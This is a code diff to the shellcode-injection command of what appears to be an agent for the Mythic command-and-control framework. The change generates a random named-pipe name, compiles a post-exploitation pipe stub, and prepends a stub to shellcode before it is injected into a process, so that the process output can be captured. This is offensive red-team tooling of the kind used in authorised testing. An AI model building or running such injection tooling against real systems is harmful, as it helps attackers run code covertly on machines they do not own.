@@ -2,6 +2,8 @@ from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 import logging, sys
 from .utils.agent_global_settings import PROCESS_INJECT_KIT
+from .utils.agent_global_settings import compile_postex_named_pipe_stub
+import random, string
 
 '''
     [BRIEF]
@@ -191,11 +193,28 @@ class InjectShellcodeCommand(CommandBase):
                 logging.info("Prepending Named Pipe Stub for Output.")
                 
                 # Prepend Named Pipe stub (to set stdout/stderr for process)
+                # named_pipe_stub_path = 'xenon/agent_code/stub/stub.bin'
+                # with open(named_pipe_stub_path, 'rb') as f:
+                #     stub_bytes = f.read()
+
+                # Generate random pipename and compile a prepend stub
+                postex_pipename = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+                success = await compile_postex_named_pipe_stub(postex_pipename)
+                if not success:
+                    raise Exception("Failed to compile postex named pipe stub")
+                
+                taskData.args.add_arg("postex_pipename", postex_pipename, type=ParameterType.String, parameter_group_info=[ParameterGroupInfo(
+                    group_name="Existing"
+                )])
+                logging.info(f"[+] Compiled postex task named pipe: \\\\.\\pipe\\{postex_pipename}")
+
                 named_pipe_stub_path = 'xenon/agent_code/stub/stub.bin'
                 with open(named_pipe_stub_path, 'rb') as f:
                     stub_bytes = f.read()
+
                 prefixed_shellcode = stub_bytes + shellcode_contents.Content
-                
+
+
                 # Use TypedArray format to send raw bytes (same format as kit bytes)
                 shellcode_typed_array = [["bytes", prefixed_shellcode.hex()]]
                 taskData.args.add_arg("shellcode_bytes", shellcode_typed_array, type=ParameterType.TypedArray, parameter_group_info=[ParameterGroupInfo(
